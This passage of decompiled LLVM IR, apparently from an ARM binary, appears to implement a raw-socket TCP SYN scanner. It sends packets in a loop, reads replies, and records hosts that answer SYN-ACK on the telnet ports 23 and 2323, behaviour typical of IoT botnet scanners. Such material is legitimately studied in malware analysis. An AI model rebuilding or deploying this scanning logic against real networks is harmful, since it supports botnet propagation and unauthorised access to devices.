  %v2_11df0 = icmp ugt i32 %v1_11d1c, 10
  store i1 %v2_11df0, i1* %cpsr_c.global-to-local, align 1
  %v7_11df0 = icmp eq i32 %v1_11d1c, 11
  store i1 %v7_11df0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11df0, label %dec_label_pc_11d18, label %bb294

bb294:                                            ; preds = %dec_label_pc_11dec
  %v3_11df4 = icmp ne i32 %v1_11dec, 0
  store i1 %v3_11df4, i1* %cpsr_c.global-to-local, align 1
  %v8_11df4 = icmp eq i32 %v1_11dec, 1
  store i1 %v8_11df4, i1* %cpsr_z.global-to-local, align 1
  %v2_11df8 = xor i1 %v3_11df4, true
  %v3_11df8 = or i1 %v8_11df4, %v2_11df8
  br i1 %v3_11df8, label %dec_label_pc_11d18, label %dec_label_pc_11dfc

dec_label_pc_11dfc:                               ; preds = %bb294
  %v2_11dfc = icmp ugt i32 %v1_11d1c, 21
  store i1 %v2_11dfc, i1* %cpsr_c.global-to-local, align 1
  %v7_11dfc = icmp eq i32 %v1_11d1c, 22
  store i1 %v7_11dfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11dfc, label %dec_label_pc_11d18, label %bb295

bb295:                                            ; preds = %dec_label_pc_11dfc
  %v3_11e00 = icmp ugt i32 %v1_11d1c, 20
  store i1 %v3_11e00, i1* %cpsr_c.global-to-local, align 1
  %v8_11e00 = icmp eq i32 %v1_11d1c, 21
  store i1 %v8_11e00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11e00, label %dec_label_pc_11d18, label %dec_label_pc_11e08

dec_label_pc_11e08:                               ; preds = %bb295
  %v2_11e08 = icmp ugt i32 %v1_11d1c, 27
  store i1 %v2_11e08, i1* %cpsr_c.global-to-local, align 1
  %v7_11e08 = icmp eq i32 %v1_11d1c, 28
  store i1 %v7_11e08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11e08, label %dec_label_pc_11d18, label %bb296

bb296:                                            ; preds = %dec_label_pc_11e08
  %v3_11e0c = icmp ugt i32 %v1_11d1c, 25
  store i1 %v3_11e0c, i1* %cpsr_c.global-to-local, align 1
  %v8_11e0c = icmp eq i32 %v1_11d1c, 26
  store i1 %v8_11e0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11e0c, label %dec_label_pc_11d18, label %dec_label_pc_11e14

dec_label_pc_11e14:                               ; preds = %bb296
  %v2_11e14 = icmp ugt i32 %v1_11d1c, 29
  store i1 %v2_11e14, i1* %cpsr_c.global-to-local, align 1
  %v7_11e14 = icmp eq i32 %v1_11d1c, 30
  store i1 %v7_11e14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11e14, label %dec_label_pc_11d18, label %bb297

bb297:                                            ; preds = %dec_label_pc_11e14
  %v3_11e18 = icmp ugt i32 %v1_11d1c, 28
  store i1 %v3_11e18, i1* %cpsr_c.global-to-local, align 1
  %v8_11e18 = icmp eq i32 %v1_11d1c, 29
  store i1 %v8_11e18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11e18, label %dec_label_pc_11d18, label %dec_label_pc_11e20

dec_label_pc_11e20:                               ; preds = %bb297
  %v2_11e20 = icmp ugt i32 %v1_11d1c, 54
  store i1 %v2_11e20, i1* %cpsr_c.global-to-local, align 1
  %v7_11e20 = icmp eq i32 %v1_11d1c, 55
  store i1 %v7_11e20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11e20, label %dec_label_pc_11d18, label %bb298

bb298:                                            ; preds = %dec_label_pc_11e20
  %v3_11e24 = icmp ugt i32 %v1_11d1c, 32
  store i1 %v3_11e24, i1* %cpsr_c.global-to-local, align 1
  %v8_11e24 = icmp eq i32 %v1_11d1c, 33
  store i1 %v8_11e24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11e24, label %dec_label_pc_11d18, label %dec_label_pc_11e2c

dec_label_pc_11e2c:                               ; preds = %bb298
  %v2_11e2c = icmp ugt i32 %v1_11d1c, 214
  store i1 %v2_11e2c, i1* %cpsr_c.global-to-local, align 1
  %v7_11e2c = icmp eq i32 %v1_11d1c, 215
  store i1 %v7_11e2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11e2c, label %.thread33, label %bb299

bb299:                                            ; preds = %dec_label_pc_11e2c
  %v3_11e30 = icmp ugt i32 %v1_11d1c, 213
  store i1 %v3_11e30, i1* %cpsr_c.global-to-local, align 1
  %v8_11e30 = icmp eq i32 %v1_11d1c, 214
  store i1 %v8_11e30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11e30, label %bb300, label %dec_label_pc_11e40

.thread33:                                        ; preds = %dec_label_pc_11e2c
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11d18

bb300:                                            ; preds = %bb299
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11d18

dec_label_pc_11e40:                               ; preds = %bb299
  store i32 0, i32* @r4, align 4
  %v5_11e4c = call i32 @llvm.bswap.i32(i32 %v0_11d18)
  store i32 %v5_11e4c, i32* %r3.global-to-local, align 4
  %tmp301 = and i32 %v0_11d18, 65280
  %tmp302 = call i32 @llvm.bswap.i32(i32 %tmp301)
  %v1_11e54 = and i32 %v5_11e4c, ptrtoint (i32* @global_var_ff00.79 to i32)
  %v3_11e58 = mul nuw i32 %v3_11d38, 16777216
  %v3_11e5c = udiv i32 %tmp302, 256
  %v4_11e60 = mul i32 %v1_11e54, 256
  %tmp303 = and i32 %v0_11d18, 32768
  %v3_11e64 = icmp ne i32 %tmp303, 0
  store i1 %v3_11e64, i1* %cpsr_c.global-to-local, align 1
  %v4_11e64 = udiv i32 %v5_11e4c, 16777216
  store i32 ptrtoint (i32* @global_var_1cdc0.256 to i32), i32* @r0, align 4
  %v5_11e64 = or i32 %v4_11e64, %v3_11e58
  %v5_11e60 = or i32 %v5_11e64, %v4_11e60
  %v2_11e6c = or i32 %v5_11e60, %v3_11e5c
  store i32 %v2_11e6c, i32* %r2.global-to-local, align 4
  %v4_11e70 = trunc i32 %v4_11e64 to i8
  store i8 %v4_11e70, i8* @global_var_1cdd0.371, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i8 0, i8* bitcast (i32* @global_var_1cdca.372 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1cdcb.373 to i8*), align 4
  %v2_11e80 = call i32 @function_f19c(i32 ptrtoint (i32* @global_var_1cdc0.256 to i32), i32 20)
  store i32 ptrtoint (i32* @global_var_1cdc0.256 to i32), i32* %ip.global-to-local, align 4
  %sext7 = mul i32 %v2_11e80, 16777216
  %v1_11e88 = sdiv i32 %sext7, 16777216
  store i32 %v1_11e88, i32* %r3.global-to-local, align 4
  %v4_11e8c = ashr i32 %sext7, 31
  store i32 %v4_11e8c, i32* %r2.global-to-local, align 4
  %v1_11e90 = trunc i32 %v1_11e88 to i8
  store i8 %v1_11e90, i8* bitcast (i32* @global_var_1cdca.372 to i8*), align 4
  %v1_11e94 = trunc i32 %v4_11e8c to i8
  store i8 %v1_11e94, i8* bitcast (i32* @global_var_1cdcb.373 to i8*), align 4
  %v3_11e98 = load i32, i32* %stack_var_-52, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_11ea0 = srem i32 %v3_11e98, 10
  store i32 %v2_11ea0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11ea4 = icmp eq i32 %v2_11ea0, 0
  store i1 %v2_11ea4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11ea4, label %.thread199, label %bb304

.thread199:                                       ; preds = %dec_label_pc_11e40
  store i32 ptrtoint (i32* @global_var_1cdd4.260 to i32), i32* @lr, align 4
  br label %.thread43.thread74

bb304:                                            ; preds = %dec_label_pc_11e40
  store i32 ptrtoint (i32* @global_var_1cdd4.260 to i32), i32* %r0.global-to-local, align 4
  store i32 23, i32* %r3.global-to-local, align 4
  %v1_11eb4 = load i32, i32* @r4, align 4
  %v2_11eb4 = trunc i32 %v1_11eb4 to i8
  store i8 %v2_11eb4, i8* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1cdd4.260 to i32), i32 2) to i8*), align 2
  %v0_11eb8.pr.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11eb8.pr.pre, label %.thread43.thread74, label %.thread40

.thread40:                                        ; preds = %bb304
  %v1_11eb8 = load i32, i32* %r3.global-to-local, align 4
  %v2_11eb8 = trunc i32 %v1_11eb8 to i8
  %v3_11eb8 = load i32, i32* %r0.global-to-local, align 4
  %v4_11eb8 = add i32 %v3_11eb8, 3
  %v5_11eb8 = inttoptr i32 %v4_11eb8 to i8*
  store i8 %v2_11eb8, i8* %v5_11eb8, align 1
  %v0_11ec0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_1cdc0.256 to i32), i32* %r0.global-to-local, align 4
  br i1 %v0_11ec0.pr.pr, label %.thread46, label %.thread48

.thread43.thread74:                               ; preds = %bb304, %.thread199
  store i32 ptrtoint (i32* @global_var_1cdc0.256 to i32), i32* %r0.global-to-local, align 4
  br label %.thread46

.thread46:                                        ; preds = %.thread40, %.thread43.thread74
  store i32 9, i32* %r3.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  %v3_11ec8 = load i32, i32* @lr, align 4
  %v4_11ec8 = add i32 %v3_11ec8, 2
  %v5_11ec8 = inttoptr i32 %v4_11ec8 to i8*
  store i8 9, i8* %v5_11ec8, align 1
  %v0_11ecc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11ecc.pr.pr, label %bb305, label %.thread48

bb305:                                            ; preds = %.thread46
  %v1_11ecc = load i32, i32* %r2.global-to-local, align 4
  %v2_11ecc = trunc i32 %v1_11ecc to i8
  %v3_11ecc = load i32, i32* @lr, align 4
  %v4_11ecc = add i32 %v3_11ecc, 3
  %v5_11ecc = inttoptr i32 %v4_11ecc to i8*
  store i8 %v2_11ecc, i8* %v5_11ecc, align 1
  br label %.thread48

.thread48:                                        ; preds = %.thread40, %.thread46, %bb305
  %v3_11ed0 = load i8, i8* @global_var_1cdd0.371, align 1
  %v4_11ed0 = sext i8 %v3_11ed0 to i32
  store i32 %v4_11ed0, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cdd4.260 to i32), i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cdd4.260 to i32), i32* @r1, align 4
  store i8 %v3_11ed0, i8* @global_var_1cdd8.374, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_11ee8 = load i32, i32* %sl.global-to-local, align 4
  %v1_11ee8 = trunc i32 %v0_11ee8 to i8
  store i8 %v1_11ee8, i8* bitcast (i32* @global_var_1cde4.375 to i8*), align 4
  store i8 %v1_11ee8, i8* bitcast (i32* @global_var_1cde5.376 to i8*), align 4
  %v4_11ef0 = call i32 @function_f1f8(i32 ptrtoint (i32* @global_var_1cdc0.256 to i32), i32 ptrtoint (i32* @global_var_1cdd4.260 to i32), i32 5120, i32 20)
  %sext = mul i32 %v4_11ef0, 16777216
  %v1_11ef8 = sdiv i32 %sext, 16777216
  %v3_11f00 = ashr i32 %sext, 31
  %v2_11f04 = load i32, i32* @global_var_1cdd4.260, align 4
  %v1_11f0c = trunc i32 %v3_11f00 to i8
  store i8 %v1_11f0c, i8* bitcast (i32* @global_var_1cde5.376 to i8*), align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v3_11f20 = load i8, i8* @global_var_1cdd0.371, align 1
  %v4_11f20 = sext i8 %v3_11f20 to i32
  store i32 %v4_11f20, i32* %r4.global-to-local, align 4
  %v2_11f24 = load i32, i32* @global_var_1ce14.254, align 4
  store i32 %v2_11f24, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cdd4.260 to i32), i32* %ip.global-to-local, align 4
  %v1_11f34 = and i32 %v2_11f04, 8388608
  %v2_11f34 = icmp ne i32 %v1_11f34, 0
  store i1 %v2_11f34, i1* %cpsr_c.global-to-local, align 1
  %v1_11f3c = trunc i32 %v1_11ef8 to i8
  store i8 %v1_11f3c, i8* bitcast (i32* @global_var_1cde4.375 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_1cdc0.256 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v2_11f50, i32* %lr.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v9_11f64 = call i32 @sendto(i32 %v2_11f24, i32* nonnull @global_var_1cdc0.256, i32 40, i32 16384, %sockaddr* %tmp279, i32 16)
  store i32 %v9_11f64, i32* %r0.global-to-local, align 4
  %v3_11f68 = load i32, i32* %stack_var_-52, align 4
  %v1_11f6c = add i32 %v3_11f68, 1
  store i32 %v1_11f6c, i32* %r3.global-to-local, align 4
  %v3_11f70 = icmp ugt i32 %v1_11f6c, 383
  store i1 %v3_11f70, i1* %cpsr_c.global-to-local, align 1
  %v8_11f70 = icmp eq i32 %v1_11f6c, 384
  store i1 %v8_11f70, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_11f6c, i32* %stack_var_-52, align 4
  %v5_11f78 = icmp slt i32 %v1_11f6c, 384
  br i1 %v5_11f78, label %.thread48.dec_label_pc_11ce8_crit_edge, label %dec_label_pc_11f7c

.thread48.dec_label_pc_11ce8_crit_edge:           ; preds = %.thread48
  %v0_11ce8.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_11ce8

dec_label_pc_11f7c:                               ; preds = %.thread48
  %v0_11f7c = load i32, i32* @r8, align 4
  br label %dec_label_pc_11f80

dec_label_pc_11f80:                               ; preds = %dec_label_pc_11cc8, %dec_label_pc_11f7c
  %stack_var_-1872.1 = phi i32 [ %stack_var_-1872.0, %dec_label_pc_11cc8 ], [ %v0_11f7c, %dec_label_pc_11f7c ]
  %v0_11f80 = call i32* @__errno_location()
  %v2_11f80 = ptrtoint i32* %v0_11f80 to i32
  store i32 %v2_11f80, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_11f8c

dec_label_pc_11f8c:                               ; preds = %dec_label_pc_1206c, %dec_label_pc_12064, %dec_label_pc_1205c, %dec_label_pc_1202c, %dec_label_pc_1201c, %dec_label_pc_11ff8, %dec_label_pc_11fe0, %dec_label_pc_12054, %dec_label_pc_12048, %dec_label_pc_11fd8, %dec_label_pc_1210c, %dec_label_pc_11f80
  store i32 0, i32* %v0_11f80, align 4
  %v2_11f9c = load i32, i32* @global_var_1ce14.254, align 4
  store i32 %v2_11f9c, i32* @r0, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1514, i32* @r2, align 4
  store i32 %v2_11cb8, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v7_11fbc = call i32 @_recvfrom(i32 %v2_11f9c, i32 %v2_11cb8, i32 1514, i32 16384, i32 0, i32 0)
  store i32 %v7_11fbc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11fc0 = icmp eq i32 %v7_11fbc, 0
  store i1 %v2_11fc0, i1* %cpsr_z.global-to-local, align 1
  %tmp306 = icmp slt i32 %v7_11fbc, 1
  br i1 %tmp306, label %dec_label_pc_12140, label %dec_label_pc_11fc8

dec_label_pc_11fc8:                               ; preds = %dec_label_pc_11f8c
  store i32 %v2_11f80, i32* %lr.global-to-local, align 4
  %v2_11fcc = load i32, i32* %v0_11f80, align 4
  store i32 %v2_11fcc, i32* %r3.global-to-local, align 4
  %v2_11fd0 = icmp ugt i32 %v2_11fcc, 10
  store i1 %v2_11fd0, i1* %cpsr_c.global-to-local, align 1
  %v7_11fd0 = icmp eq i32 %v2_11fcc, 11
  store i1 %v7_11fd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11fd0, label %dec_label_pc_12140, label %dec_label_pc_11fd8

dec_label_pc_11fd8:                               ; preds = %dec_label_pc_11fc8
  %v2_11fd8 = icmp ugt i32 %v7_11fbc, 38
  store i1 %v2_11fd8, i1* %cpsr_c.global-to-local, align 1
  %v7_11fd8 = icmp eq i32 %v7_11fbc, 39
  store i1 %v7_11fd8, i1* %cpsr_z.global-to-local, align 1
  %v2_11fdc = xor i1 %v2_11fd8, true
  %v3_11fdc = or i1 %v7_11fd8, %v2_11fdc
  br i1 %v3_11fdc, label %dec_label_pc_11f8c, label %dec_label_pc_11fe0

dec_label_pc_11fe0:                               ; preds = %dec_label_pc_11fd8
  store i32 %v2_11cb8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cdf4.141 to i32), i32* %r1.global-to-local, align 4
  %v3_11fe8 = load i32, i32* %v2_11fe8, align 4
  store i32 %v3_11fe8, i32* %r2.global-to-local, align 4
  %v2_11fec = load i32, i32* @global_var_1cdf4.141, align 4
  store i32 %v2_11fec, i32* %r3.global-to-local, align 4
  %v3_11ff0 = icmp uge i32 %v3_11fe8, %v2_11fec
  store i1 %v3_11ff0, i1* %cpsr_c.global-to-local, align 1
  %v9_11ff0 = icmp eq i32 %v3_11fe8, %v2_11fec
  store i1 %v9_11ff0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11ff0, label %dec_label_pc_11ff8, label %dec_label_pc_11f8c

dec_label_pc_11ff8:                               ; preds = %dec_label_pc_11fe0
  %v3_11ff8 = load i8, i8* %v2_11ff8, align 1
  %v4_11ff8 = zext i8 %v3_11ff8 to i32
  store i32 %v4_11ff8, i32* %r3.global-to-local, align 4
  %v2_11ffc = icmp ugt i8 %v3_11ff8, 5
  store i1 %v2_11ffc, i1* %cpsr_c.global-to-local, align 1
  %v7_11ffc = icmp eq i8 %v3_11ff8, 6
  store i1 %v7_11ffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11ffc, label %dec_label_pc_12004, label %dec_label_pc_11f8c

dec_label_pc_12004:                               ; preds = %dec_label_pc_11ff8
  store i32 %v2_11cbc, i32* %r3.global-to-local, align 4
  %v2_12008 = load i8, i8* %tmp278, align 4
  %v3_12008 = zext i8 %v2_12008 to i32
  store i32 %v3_12008, i32* %r2.global-to-local, align 4
  %v3_1200c = load i8, i8* %v2_1200c, align 1
  %v4_1200c = zext i8 %v3_1200c to i32
  store i32 %v4_1200c, i32* %r3.global-to-local, align 4
  %v4_12010 = mul nuw nsw i32 %v4_1200c, 256
  %v5_12010 = or i32 %v4_12010, %v3_12008
  store i32 %v5_12010, i32* %r2.global-to-local, align 4
  %v2_12014 = icmp ugt i32 %v5_12010, 5887
  store i1 %v2_12014, i1* %cpsr_c.global-to-local, align 1
  %v7_12014 = icmp eq i32 %v5_12010, 5888
  store i1 %v7_12014, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12014, label %dec_label_pc_1202c, label %dec_label_pc_1201c

dec_label_pc_1201c:                               ; preds = %dec_label_pc_12004
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_12024 = icmp ugt i32 %v5_12010, 4872
  store i1 %v3_12024, i1* %cpsr_c.global-to-local, align 1
  %v9_12024 = icmp eq i32 %v5_12010, 4873
  store i1 %v9_12024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12024, label %dec_label_pc_1202c, label %dec_label_pc_11f8c

dec_label_pc_1202c:                               ; preds = %dec_label_pc_1201c, %dec_label_pc_12004
  store i32 %v2_11cbc, i32* %ip.global-to-local, align 4
  %v3_12030 = load i8, i8* %v2_12030, align 2
  %v4_12030 = zext i8 %v3_12030 to i32
  store i32 %v4_12030, i32* %r3.global-to-local, align 4
  %v3_12034 = load i8, i8* %v2_12034, align 1
  %v4_12034 = zext i8 %v3_12034 to i32
  store i32 %v4_12034, i32* %r2.global-to-local, align 4
  store i32 %v4_1181c, i32* %lr.global-to-local, align 4
  %v4_1203c = mul nuw nsw i32 %v4_12034, 256
  %v5_1203c = or i32 %v4_1203c, %v4_12030
  store i32 %v5_1203c, i32* %r3.global-to-local, align 4
  %v3_12040 = icmp uge i32 %v5_1203c, %v4_1181c
  store i1 %v3_12040, i1* %cpsr_c.global-to-local, align 1
  %v9_12040 = icmp eq i32 %v5_1203c, %v4_1181c
  store i1 %v9_12040, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12040, label %dec_label_pc_12048, label %dec_label_pc_11f8c

dec_label_pc_12048:                               ; preds = %dec_label_pc_1202c
  %v3_12048 = load i8, i8* %v2_12048, align 1
  %v4_12048 = zext i8 %v3_12048 to i32
  store i32 %v4_12048, i32* %r3.global-to-local, align 4
  %v1_1204c = and i32 %v4_12048, 2
  %v2_1204c = icmp eq i32 %v1_1204c, 0
  store i1 %v2_1204c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1204c, label %dec_label_pc_11f8c, label %dec_label_pc_12054

dec_label_pc_12054:                               ; preds = %dec_label_pc_12048
  %v1_12054 = and i32 %v4_12048, 16
  %v2_12054 = icmp eq i32 %v1_12054, 0
  store i1 %v2_12054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12054, label %dec_label_pc_11f8c, label %dec_label_pc_1205c

dec_label_pc_1205c:                               ; preds = %dec_label_pc_12054
  %v1_1205c = and i32 %v4_12048, 4
  %v2_1205c = icmp eq i32 %v1_1205c, 0
  store i1 %v2_1205c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1205c, label %dec_label_pc_12064, label %dec_label_pc_11f8c

dec_label_pc_12064:                               ; preds = %dec_label_pc_1205c
  %tmp454 = urem i8 %v3_12048, 2
  %v2_12064 = icmp eq i8 %tmp454, 0
  store i1 %v2_12064, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12064, label %dec_label_pc_1206c, label %dec_label_pc_11f8c

dec_label_pc_1206c:                               ; preds = %dec_label_pc_12064
  %v3_1206c = load i32, i32* %v2_1206c, align 4
  %v1_12074 = and i32 %v3_1206c, ptrtoint (i32* @global_var_ff00.79 to i32)
  %v3_12078 = mul i32 %v3_1206c, 16777216
  %v1_12070 = udiv i32 %v3_1206c, 256
  %v3_1207c = and i32 %v1_12070, 65280
  %v4_12080 = mul i32 %v1_12074, 256
  %v4_12084 = udiv i32 %v3_1206c, 16777216
  %v5_12084 = or i32 %v4_12084, %v3_12078
  %v5_12080 = or i32 %v5_12084, %v4_12080
  %v2_12088 = or i32 %v5_12080, %v3_1207c
  %v1_1208c = add i32 %v2_12088, -1
  %v1_12090 = udiv i32 %v1_1208c, 256
  %v3_12094 = and i32 %v1_12090, 65280
  %v1_12098 = and i32 %v1_1208c, 65280
  store i32 %v1_12098, i32* %r2.global-to-local, align 4
  %v3_1209c = mul i32 %v1_1208c, 16777216
  %v4_120a0 = udiv i32 %v1_1208c, 16777216
  %v5_120a0 = or i32 %v3_12094, %v4_120a0
  store i32 %v5_120a0, i32* %r1.global-to-local, align 4
  store i32 %v2_11cb8, i32* %r3.global-to-local, align 4
  %v4_120a8 = mul nuw nsw i32 %v1_12098, 256
  %v5_120a8 = or i32 %v4_120a8, %v3_1209c
  store i32 %v5_120a8, i32* %r0.global-to-local, align 4
  %v3_120ac = load i32, i32* %v2_120ac, align 4
  store i32 %v3_120ac, i32* %r2.global-to-local, align 4
  %v2_120b0 = call i32 @llvm.bswap.i32(i32 %v1_1208c)
  store i32 %v2_120b0, i32* %ip.global-to-local, align 4
  %v3_120b4 = icmp uge i32 %v2_120b0, %v3_120ac
  store i1 %v3_120b4, i1* %cpsr_c.global-to-local, align 1
  %v9_120b4 = icmp eq i32 %v2_120b0, %v3_120ac
  store i1 %v9_120b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_120b4, label %dec_label_pc_120bc, label %dec_label_pc_11f8c

dec_label_pc_120bc:                               ; preds = %dec_label_pc_1206c
  %v0_120bc = load i32, i32* @r4, align 4
  %v2_120bc = icmp ugt i32 %v0_120bc, 254
  store i1 %v2_120bc, i1* %cpsr_c.global-to-local, align 1
  %v7_120bc = icmp eq i32 %v0_120bc, 255
  store i1 %v7_120bc, i1* %cpsr_z.global-to-local, align 1
  %v8_120c0 = icmp sgt i32 %v0_120bc, 255
  br i1 %v8_120c0, label %dec_label_pc_12140, label %dec_label_pc_120c4

dec_label_pc_120c4:                               ; preds = %dec_label_pc_120bc
  store i32 ptrtoint (i32* @global_var_1ce10.252 to i32), i32* %lr.global-to-local, align 4
  %v3_120c8 = mul i32 %v0_120bc, 256
  store i32 %v3_120c8, i32* %r2.global-to-local, align 4
  %v2_120cc = load i32, i32* @global_var_1ce10.252, align 4
  store i32 %v2_120cc, i32* %r1.global-to-local, align 4
  %v2_120d4 = mul i32 %v0_120bc, 288
  store i32 %v2_120d4, i32* %r3.global-to-local, align 4
  %v2_120d8 = add i32 %v2_120cc, %v2_120d4
  store i32 %v2_120d8, i32* @r0, align 4
  %v1_120dc = add i32 %v2_120d8, 12
  %v2_120dc = inttoptr i32 %v1_120dc to i32*
  %v3_120dc = load i32, i32* %v2_120dc, align 4
  store i32 %v3_120dc, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_120e0 = icmp eq i32 %v3_120dc, 0
  store i1 %v2_120e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_120e0, label %dec_label_pc_1210c, label %dec_label_pc_120ec.preheader

dec_label_pc_120ec.preheader:                     ; preds = %dec_label_pc_120c4
  %v2_120e4 = add i32 %v2_120d8, 288
  store i32 %v2_120e4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_120ec

dec_label_pc_120ec:                               ; preds = %dec_label_pc_120ec.preheader, %dec_label_pc_120f8
  %v0_120f8 = phi i32 [ %v2_120e4, %dec_label_pc_120ec.preheader ], [ %v1_12104, %dec_label_pc_120f8 ]
  %v0_120ec = phi i32 [ %v0_120bc, %dec_label_pc_120ec.preheader ], [ %v1_120ec, %dec_label_pc_120f8 ]
  %v1_120ec = add i32 %v0_120ec, 1
  store i32 %v1_120ec, i32* @r4, align 4
  %v7_120f0 = icmp eq i32 %v1_120ec, 256
  br i1 %v7_120f0, label %dec_label_pc_12140.loopexit, label %dec_label_pc_120f8

dec_label_pc_120f8:                               ; preds = %dec_label_pc_120ec
  store i32 %v0_120f8, i32* @r0, align 4
  %v1_120fc = add i32 %v0_120f8, 12
  %v2_120fc = inttoptr i32 %v1_120fc to i32*
  %v3_120fc = load i32, i32* %v2_120fc, align 4
  %v2_12100 = icmp eq i32 %v3_120fc, 0
  %v1_12104 = add i32 %v0_120f8, 288
  store i32 %v1_12104, i32* %r3.global-to-local, align 4
  br i1 %v2_12100, label %dec_label_pc_1210c.loopexit, label %dec_label_pc_120ec

dec_label_pc_1210c.loopexit:                      ; preds = %dec_label_pc_120f8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1210c

dec_label_pc_1210c:                               ; preds = %dec_label_pc_1210c.loopexit, %dec_label_pc_120c4
  %v1_1210c = phi i32 [ %v0_120f8, %dec_label_pc_1210c.loopexit ], [ %v2_120d8, %dec_label_pc_120c4 ]
  %v2_1210c = add i32 %v1_1210c, 16
  %v3_1210c = inttoptr i32 %v2_1210c to i32*
  store i32 %v3_120ac, i32* %v3_1210c, align 4
  store i32 %v2_11cbc, i32* %r1.global-to-local, align 4
  %v2_12114 = load i32, i32* %stack_var_-1842, align 4
  store i32 %v2_12114, i32* %r2.global-to-local, align 4
  %v1_12118 = and i32 %v2_12114, 128
  %v2_12118 = icmp ne i32 %v1_12118, 0
  store i1 %v2_12118, i1* %cpsr_c.global-to-local, align 1
  %v3_12118 = sdiv i32 %v2_12114, 256
  store i32 %v3_12118, i32* %r3.global-to-local, align 4
  %v1_1211c = trunc i32 %v3_12118 to i8
  %v2_1211c = load i32, i32* @r0, align 4
  %v3_1211c = add i32 %v2_1211c, 21
  %v4_1211c = inttoptr i32 %v3_1211c to i8*
  store i8 %v1_1211c, i8* %v4_1211c, align 1
  %v0_12120 = load i32, i32* %r2.global-to-local, align 4
  %v1_12120 = trunc i32 %v0_12120 to i8
  %v2_12120 = load i32, i32* @r0, align 4
  %v3_12120 = add i32 %v2_12120, 20
  %v4_12120 = inttoptr i32 %v3_12120 to i8*
  store i8 %v1_12120, i8* %v4_12120, align 1
  %v0_12124 = call i32 @function_1141c()
  store i32 %v0_12124, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11f8c

dec_label_pc_1212c:                               ; preds = %dec_label_pc_11770
  store i32 ptrtoint (i32* @global_var_1ce14.254 to i32), i32* %r2.global-to-local, align 4
  %v2_12130 = load i32, i32* @global_var_1ce14.254, align 4
  store i32 %v2_12130, i32* %r0.global-to-local, align 4
  %v1_12134 = call i32 @close(i32 %v2_12130)
  store i32 %v1_12134, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12138

dec_label_pc_12138:                               ; preds = %dec_label_pc_11748, %dec_label_pc_1212c
  %v0_12138 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12138, i32* %r0.global-to-local, align 4
  call void @exit(i32 %v0_12138)
  unreachable

dec_label_pc_12140.loopexit:                      ; preds = %dec_label_pc_120ec
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12140

dec_label_pc_12140:                               ; preds = %dec_label_pc_120bc, %dec_label_pc_11fc8, %dec_label_pc_11f8c, %dec_label_pc_12140.loopexit
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1672, i32* %ip.global-to-local, align 4
  %v2_12158404 = load i32, i32* @sp, align 4
  %v3_12158405 = add i32 %v2_12158404, 1672
